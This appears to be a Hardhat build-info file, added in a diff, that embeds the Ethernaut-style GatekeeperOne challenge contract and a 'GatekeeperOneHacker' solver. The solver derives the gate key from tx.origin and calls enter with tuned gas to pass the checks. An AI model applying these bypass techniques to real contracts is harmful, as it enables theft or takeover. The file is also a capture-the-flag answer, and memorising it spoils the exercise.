@@ -1,0 +1,42 @@
+{
+  "_format": "hh3-sol-build-info-1",
+  "id": "solc-0_8_28-814d5b2c1cb4a54cd50062aa57f001a4bf06af17",
+  "solcVersion": "0.8.28",
+  "solcLongVersion": "0.8.28+commit.7893614a",
+  "userSourceNameMap": {
+    "contracts/GatekeeperOneHacker.sol": "project/contracts/GatekeeperOneHacker.sol"
+  },
+  "input": {
+    "language": "Solidity",
+    "settings": {
+      "evmVersion": "cancun",
+      "optimizer": {
+        "enabled": true,
+        "runs": 200
+      },
+      "outputSelection": {
+        "*": {
+          "": [
+            "ast"
+          ],
+          "*": [
+            "abi",
+            "evm.bytecode",
+            "evm.deployedBytecode",
+            "evm.methodIdentifiers",
+            "metadata"
+          ]
+        }
+      },
+      "remappings": []
+    },
+    "sources": {
+      "project/contracts/GatekeeperOne.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperOne {\n    address public entrant;\n\n    modifier gateOne() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n\n    modifier gateTwo() {\n        require(gasleft() % 8191 == 0);\n        _;\n    }\n\n    modifier gateThree(bytes8 _gateKey) {\n        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n        require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n        _;\n    }\n\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n        entrant = tx.origin;\n        return true;\n    }\n}"
+      },
+      "project/contracts/GatekeeperOneHacker.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./GatekeeperOne.sol\";\n\ncontract GatekeeperOneHacker {\n    GatekeeperOne public gatekeeper;\n    uint256 constant public gasCostOfGateOne = 140;\n    // event AfterGas(uint256 afterGas, uint256 beforeGas);\n    constructor(address _gatekeeper) {\n        gatekeeper = GatekeeperOne(_gatekeeper);\n    }\n\n    function callEnter(bytes8 key, uint256 gasLimit) public returns (bool) {\n        // uint256 beforeGas = gasleft();\n        bool result = gatekeeper.enter{ gas: gasLimit }(key);\n        // uint256 afterGas = beforeGas - gasleft();\n        return result;\n    }\n\n    function checkKey(bytes8 _gateKey, address txOrigin) public pure returns (bool[3] memory) {\n        return [\n            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),\n            uint32(uint64(_gateKey)) != uint64(_gateKey),\n            uint32(uint64(_gateKey)) == uint16(uint160(txOrigin))\n        ];\n    }\n\n    function getDerivedKey(address txOrigin) public pure returns (bytes8) {\n        return bytes8(uint64(uint160(txOrigin))) & 0xFFFFFFFF0000FFFF;\n    }\n\n    function measureGateOneOffset() external view returns (uint256) {\n        uint256 startGas = gasleft();\n        // Only call the gateOne modifier logic\n        require(msg.sender != tx.origin, \"Failed gate 1\");\n        uint256 used = startGas - gasleft();\n        return used;\n    }\n\n\n    // function eip150Check() external returns (uint256) {\n    //     uint256 before = gasleft();\n    //     (bool success,) = address(this).call{gas: before}(abi.encodeWithSignature(\"dummy()\"));\n    //     return before - gasleft(); // should be roughly before/64 if EIP-150 applies\n    // }\n\n    // function dummy() external {}\n}"
+      }
+    }
+  }
+}
